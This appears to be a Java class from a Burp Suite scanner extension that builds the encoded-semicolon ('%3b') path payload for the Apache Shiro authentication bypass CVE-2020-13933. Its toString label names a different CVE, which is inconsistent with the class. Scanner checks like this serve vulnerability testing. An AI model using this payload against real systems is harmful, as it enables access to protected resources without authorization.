package burp.core.scanner.active.shiroscanner;

public class CVE_2020_13933 {

    public String requestURI;

    CVE_2020_13933(String requestURI){
        if (!requestURI.endsWith("/")) {
            int i = requestURI.lastIndexOf("/");
            String a2 = requestURI.substring(0,i+1);
            String a3 = requestURI.substring(i+1);
            this.requestURI = a2 + "%3b" + a3;
        }else{
            this.requestURI = "/xxxxxxxxxxxxxxxxxxxxxx";
        }
    }

    public String getRequestURI() {
        return requestURI;
    }

    @Override
    public String toString() {
        return "CVE_2020_11989";
    }
}
